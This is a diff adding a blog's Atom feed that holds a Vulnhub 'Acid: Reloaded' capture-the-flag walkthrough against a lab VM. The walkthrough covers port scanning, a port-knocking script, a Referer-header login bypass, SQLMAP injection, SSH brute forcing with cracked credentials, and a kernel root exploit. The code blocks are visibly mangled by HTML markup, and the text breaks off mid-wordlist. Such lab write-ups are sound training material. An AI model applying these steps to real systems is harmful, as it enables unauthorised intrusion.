@@ -1,0 +1,2205 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: sql injection | F4l13n5n0w]]></title>
+  <link href="http://f4l13n5n0w.github.io/blog/categories/sql-injection/atom.xml" rel="self"/>
+  <link href="http://f4l13n5n0w.github.io/"/>
+  <updated>2017-04-08T06:55:00-04:00</updated>
+  <id>http://f4l13n5n0w.github.io/</id>
+  <author>
+    <name><![CDATA[F4l13n5n0w]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[[Vulnhub]acid_reloaded]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2015/09/12/acid-reloaded/"/>
+    <updated>2015-09-12T07:49:42-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2015/09/12/acid-reloaded</id>
+    <content type="html"><![CDATA[<p><strong>Acid: Reloaded</strong> is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-reloaded,127/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Links</h2>
+
+<p>watch video online:
+<iframe src='http://player.vimeo.com/video/139052982?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali Linux (<em>10.1.1.139/24</em>)</p>
+
+<p>Target: Acid: Server (<em>10.1.1.130/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li>Ports knocking to active hidden ports</li>
+<li>Hidden paths and files can be found via tool <code>dirbuster</code></li>
+<li>Web login bypass by add HTTP header <code>Referer</code> in Request</li>
+<li>SQL injection vulnerability exists in <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code>, exploit it and check database to find hidden file location <code>UB3R/strcpy.exe</code></li>
+<li>Download and analyze the EXE file, found it binded with other files, use <code>foremost</code> tool to recover hidden files and find XML contacts file <code>Avinash.contact</code></li>
+<li>Making a dictionary file from the contact file, here need to note that there is a base64 encoded string, decode it and put in dictionary file</li>
+<li>use HYDRA to brute force SSH service with dictionary file and found cracked login <code>makke/NooB@123</code></li>
+<li>Login as user <code>makke</code>, poking around and found Overlayfs Local Root (CVE-2015-1328) vulnerability exist and exploit it to get ROOT</li>
+<li>overlayfs Local Root exploit (CVE-2015-1328) exist, exploit it to get ROOT</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
+<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
+<li>Write python script to make port knocking to active filtered ports</li>
+<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
+<li>Web application scanning by Nikto to find more details or vulnerabilities [<font color="FF8000">nikto</font>]</li>
+<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
+<li>Found the hidden web login page and bypass it</li>
+<li>Exploit SQL injection vulnerability found in <code>/bin/l33t_haxor.php?id=</code> to get hidden file location <code>UB3R/strcpy.exe</code></li>
+<li>Use <code>foremost</code> to recover hidden files in <code>strcpy.exe</code> [<font color="FF8000">foremost</font>]</li>
+<li>Create dictionary file and use HYDRA to brute force SSH login, and found <code>makke/NooB@123</code></li>
+<li>Enumeration and found the server is vulnerable to CVE-2015-1328, exploit it to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
+<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
+<li><a href="https://portswigger.net/burp/">burp suite</a></li>
+<li><a href="http://foremost.sourceforge.net/">foremost</a></li>
+<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.139 in this case).</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
+</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
+</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (&lt;a href="http://www.nta-monitor.com/tools/arp-scan/">http://www.nta-monitor.com/tools/arp-scan/&lt;/a>)
+</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
+</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
+</span><span class='line'>10.1.1.139  00:0c:29:bb:6e:b3   VMware, Inc.
+</span><span class='line'>10.1.1.254  00:50:56:e3:03:1b   VMware, Inc.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>4 packets received by filter, 0 packets dropped by kernel
+</span><span class='line'>Ending arp-scan 1.9: 256 hosts scanned in 2.611 seconds (98.05 hosts/sec). 4 responded</span></code></pre></td></tr></table></div></figure></p>
+
+<p>10.1.1.139 is our Target!</p>
+
+<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -msf -T4 -p1-65535 -Iv 10.1.1.139
+</span><span class='line'>adding 10.1.1.139/32 mode &lt;code>TCPscan' ports&lt;/code>1-65535' pps 300
+</span><span class='line'>using interface(s) eth0
+</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
+</span><span class='line'>connected 10.1.1.130:39969 -> 10.1.1.139:22
+</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
+</span><span class='line'>sender statistics 288.7 pps with 65535 packets sent total
+</span><span class='line'>listener statistics 131072 packets recieved 0 packets droped and 0 interface drops
+</span><span class='line'>TCP open                 ssh[   22]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then I connect to target via SSH to grab banner.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh 10.1.1.139
+</span><span class='line'>    _    &lt;em>&lt;strong>&lt;em> &lt;/em>&lt;/strong> &lt;/em>&lt;em>&lt;strong>        &lt;/strong>&lt;strong>  &lt;/strong>&lt;/em>&lt;strong> _     &lt;/strong>&lt;em>    _    &lt;/em>&lt;strong>&lt;em>  &lt;/em>&lt;/strong>&lt;strong> &lt;/strong>&lt;strong>&lt;br/>
+</span><span class='line'>   / \  / &lt;/strong>&lt;em>|&lt;/em> &lt;em>|  _ \      |  _ | &lt;/em>&lt;em>&lt;strong>| |   / _ \  / \  |  _ | &lt;/strong>&lt;strong>|  _ \
+</span><span class='line'>  / _ | |    | || | | |&lt;/strong>&lt;/em>&lt;strong>| |&lt;em>) |  &lt;/em>| | |  | | | |/ _ \ | | | |  &lt;em>| | | | |
+</span><span class='line'> / &lt;/em>&lt;/strong> \ |&lt;strong>&lt;em> | || |&lt;/em>| |&lt;/strong>&lt;strong>&lt;em>|  _ &lt;| |&lt;/em>&lt;/strong>| |&lt;strong>| |&lt;em>| / &lt;/em>&lt;/strong> | |&lt;em>| | |&lt;/em>&lt;strong>| |&lt;em>| |
+</span><span class='line'>/&lt;/em>/   __&lt;/strong>&lt;em>|&lt;/em>&lt;strong>|&lt;/strong>&lt;strong>/      |_| __&lt;/strong>&lt;strong>|&lt;/strong>&lt;em>&lt;strong>_&lt;/strong>/&lt;/em>/   __&lt;strong>&lt;em>/|&lt;/em>&lt;/strong>&lt;strong>|&lt;/strong>__/&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>                                -by Acid
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Wanna Knock me out ???
+</span><span class='line'>3.2.1 Let&rsquo;s Start the Game.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#114;&#111;&#111;&#116;&#x40;&#x31;&#48;&#46;&#x31;&#46;&#49;&#46;&#x31;&#x33;&#57;">&#x72;&#x6f;&#111;&#116;&#x40;&#x31;&#x30;&#x2e;&#x31;&#46;&#x31;&#46;&#49;&#x33;&#57;&lt;/a>&rsquo;s password:</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Looks like we need ports knocking to find hidden ports. Then the following python script will do the port knocking</p>
+
+<p><figure class='code'><figcaption><span>knock.py </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">target</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.1</span><span class="o">.</span><span class="mf">1.139</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">)):</span>
+</span><span class='line'>    <span class="n">packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">x</span><span class="p">,</span> <span class="n">flags</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">S</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
+</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">response</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span><span class="n">knocking</span> <span class="n">port</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span><span class="n">Done</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then use unicornscan to check again, found another port <code>33447</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# us -msf -T4 -p1-65535 -Iv 10.1.1.139
+</span><span class='line'>adding 10.1.1.139/32 mode &lt;code>TCPscan' ports&lt;/code>1-65535' pps 300
+</span><span class='line'>using interface(s) eth0
+</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
+</span><span class='line'>connected 10.1.1.130:22339 -> 10.1.1.139:22
+</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
+</span><span class='line'>connected 10.1.1.130:38957 -> 10.1.1.139:33447
+</span><span class='line'>TCP open 10.1.1.139:33447  ttl 64
+</span><span class='line'>sender statistics 277.8 pps with 65535 packets sent total
+</span><span class='line'>listener statistics 131078 packets recieved 0 packets droped and 0 interface drops
+</span><span class='line'>TCP open                 ssh[   22]     from 10.1.1.139  ttl 64
+</span><span class='line'>TCP open             unknown[33447]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Using NMAP scan to detect more information about opening services, and found WEB service is running on port <code>33447</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# nmap -sV -v -p22,33447 -T4 10.1.1.139&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Starting Nmap 6.49BETA4 ( &lt;a href="https://nmap.org">https://nmap.org&lt;/a> ) at 2015-09-11 07:26 EDT
+</span><span class='line'>NSE: Loaded 33 scripts for scanning.
+</span><span class='line'>Initiating ARP Ping Scan at 07:26
+</span><span class='line'>Scanning 10.1.1.139 [1 port]
+</span><span class='line'>Completed ARP Ping Scan at 07:26, 0.24s elapsed (1 total hosts)
+</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 07:26
+</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 07:26, 0.02s elapsed
+</span><span class='line'>Initiating SYN Stealth Scan at 07:26
+</span><span class='line'>Scanning 10.1.1.139 [2 ports]
+</span><span class='line'>Discovered open port 22/tcp on 10.1.1.139
+</span><span class='line'>Discovered open port 33447/tcp on 10.1.1.139
+</span><span class='line'>Completed SYN Stealth Scan at 07:26, 0.21s elapsed (2 total ports)
+</span><span class='line'>Initiating Service scan at 07:26
+</span><span class='line'>Scanning 2 services on 10.1.1.139
+</span><span class='line'>Completed Service scan at 07:26, 11.04s elapsed (2 services on 1 host)
+</span><span class='line'>NSE: Script scanning 10.1.1.139.
+</span><span class='line'>Initiating NSE at 07:26
+</span><span class='line'>Completed NSE at 07:26, 0.34s elapsed
+</span><span class='line'>Nmap scan report for 10.1.1.139
+</span><span class='line'>Host is up (0.00050s latency).
+</span><span class='line'>PORT      STATE SERVICE VERSION
+</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
+</span><span class='line'>MAC Address: 00:0C:29:BB:6E:B3 (VMware)
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Read data files from: /usr/bin/../share/nmap
+</span><span class='line'>Service detection performed. Please report any incorrect results at &lt;a href="https://nmap.org/submit/">https://nmap.org/submit/&lt;/a> .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
+</span><span class='line'>           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Run NIKTO scan to check the web application and found hidden folder <code>/bin/</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nikto -host &lt;a href="http://10.1.1.139:3344/">http://10.1.1.139:3344/&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>+ No web server found on 10.1.1.139:3344&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>0 host(s) tested
+</span><span class='line'>root@kali:~# nikto -host &lt;a href="http://10.1.1.139:33447/">http://10.1.1.139:33447/&lt;/a>
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Nikto v2.1.6&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Target IP:          10.1.1.139&lt;/li>
+</span><span class='line'>&lt;li>Target Hostname:    10.1.1.139&lt;/li>
+</span><span class='line'>&lt;li>Target Port:        33447
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Start Time:         2015-09-11 07:31:36 (GMT-4)&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Server: Apache/2.4.10 (Ubuntu)&lt;/li>
+</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /, fields: 0x2aa 0x51e107200fa1d&lt;/li>
+</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
+</span><span class='line'>&lt;li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li>
+</span><span class='line'>&lt;li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&lt;/li>
+</span><span class='line'>&lt;li>IP address found in the &lsquo;location&rsquo; header. The IP is &ldquo;127.0.1.1&rdquo;.&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is &ldquo;&lt;a href="http://127.0.1.1:33447/images/">http://127.0.1.1:33447/images/&lt;/a>&rdquo;.&lt;/li>
+</span><span class='line'>&lt;li>Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.&lt;/li>
+</span><span class='line'>&lt;li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-3092: /bin/: This might be interesting&hellip;&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-3092: /bin/: This might be interesting&hellip; possibly a system shell found.&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
+</span><span class='line'>&lt;li>8330 requests: 0 error(s) and 11 item(s) reported on remote host
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>End Time:           2015-09-11 07:31:58 (GMT-4) (22 seconds)&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>check the new folder <code>/bin/</code> found a login page. By checking the source code, the login process function is in <code>/includes/validation.php</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="nt">&lt;h2&gt;</span>Login to your account<span class="nt">&lt;/h2&gt;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="nt">&lt;p&gt;</span>   <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;includes/validation.php&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">name=</span><span class="s">&quot;login_form&quot;</span><span class="nt">&gt;</span>  Email: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Email Address&quot;</span> <span class="na">name=</span><span class="s">&quot;email&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;20&quot;</span> <span class="nt">/&gt;</span>  Password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Password&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span> <span class="na">id=</span><span class="s">&quot;password&quot;</span><span class="nt">/&gt;</span>  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Login&quot;</span> <span class="na">onclick=</span><span class="s">&quot;formhash(this.form, this.form.password);&quot;</span> <span class="nt">/&gt;</span>  <span class="nt">&lt;/form&gt;</span>   <span class="nt">&lt;/form&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then using dirbuster to brute force hidden files and paths and found the page <code>/bin/dashboard.php</code></p>
+
+<p>After a lot of failed tests, I finally found that HTTP header trick to bypass the login by adding the header <code>Referere: http://10.1.1.139:33447/bin/includes/validation.php</code>, Burp proxy help me to get next step.</p>
+
+<p>Then I reach here <code>http://10.1.1.139:33447/bin/l33t_haxor.php</code>, by checking the source code I found the following URL <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code> and the parameter <code>id</code> is SQL injectable.</p>
+
+<p>Using SQLMAP to exploit the SQL injection vulnerability and found the current database and tables:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&hellip;
+</span><span class='line'>available databases [4]:                                                                                                                                                         &lt;br/>
+</span><span class='line'>[&lt;em>] information_schema
+</span><span class='line'>[&lt;/em>] mysql
+</span><span class='line'>[&lt;em>] performance_schema
+</span><span class='line'>[&lt;/em>] secure_login
+</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&hellip;
+</span><span class='line'>Database: secure_login                                                                                                                                                           &lt;br/>
+</span><span class='line'>[4 tables]
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+</span><span class='line'>| UB3R/strcpy.exe |
+</span><span class='line'>| login_attempts  |
+</span><span class='line'>| members         |
+</span><span class='line'>| word            |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>
+
+<p>from the SQL injection exploit, I found <code>UB3R/strcpy.exe</code> which is interesting. Then I downloaded the binary file from <code>http://10.1.1.139:33447/UB3R/strcpy.exe</code>. By checking the file, I found there are some other files hidden in <code>strcpy.exe</code>, so I use <code>foremost</code> to recover them</p>
+
+<p>keep the same steps as above until we found the file <code>Avinash.contact</code> which is a XML file and there is a string is base64 encoded. Then I decoded it and got <code>NooB@123</code></p>
+
+<p>Then I created a dictionary file based on the names/keywords in file <code>Avinash.contact</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# cat dict.txt
+</span><span class='line'>Avinash
+</span><span class='line'>avinash
+</span><span class='line'>Makke
+</span><span class='line'>makke
+</span><span class='line'>acid
+</span><span class='line'>acid.exploit
